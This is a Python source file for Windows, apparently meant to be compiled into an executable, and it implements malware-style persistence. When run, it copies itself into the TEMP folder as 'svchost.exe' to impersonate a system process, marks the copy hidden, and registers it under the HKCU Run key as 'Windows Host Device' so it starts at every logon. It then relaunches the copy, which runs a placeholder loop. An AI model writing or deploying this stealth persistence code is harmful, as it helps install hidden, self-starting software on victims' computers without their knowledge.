import os
import sys
from shutil import copyfile as scopyfile
from subprocess import Popen
from ctypes import windll, Structure, wintypes
from winreg import HKEY_CURRENT_USER, OpenKey, SetValueEx, REG_SZ, KEY_WRITE
from time import sleep

FILE_ATTRIBUTE_HIDDEN = 0x2

class FILE_ATTRIBUTE(Structure):
    _fields_ = [("dwFileAttributes", wintypes.DWORD)]

def add_to_startup():
    current_exe_path = sys.argv[0]
    
    temp_copy_path = os.path.join(os.environ['TEMP'], "svchost.exe")
    
    try:
        scopyfile(current_exe_path, temp_copy_path)
        
        attrs = FILE_ATTRIBUTE()
        attrs.dwFileAttributes = FILE_ATTRIBUTE_HIDDEN
        windll.kernel32.SetFileAttributesW(temp_copy_path, attrs.dwFileAttributes)
            
    except:
        pass
    
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    key_name = "Windows Host Device"
    with OpenKey(HKEY_CURRENT_USER, key_path, 0, KEY_WRITE) as key:
        SetValueEx(key, key_name, 0, REG_SZ, temp_copy_path)
    
    Popen(temp_copy_path, close_fds=True)

    sys.exit(0)

def FloraNovaLumisZephyr():
    if getattr(sys, 'frozen', False):
        if sys.executable.endswith("svchost.exe"):
            while True:
                print("svchost")
                sleep(1)
        else:
            add_to_startup()
    else:
        #if .py
        pass

if __name__ == "__main__":
    FloraNovaLumisZephyr()
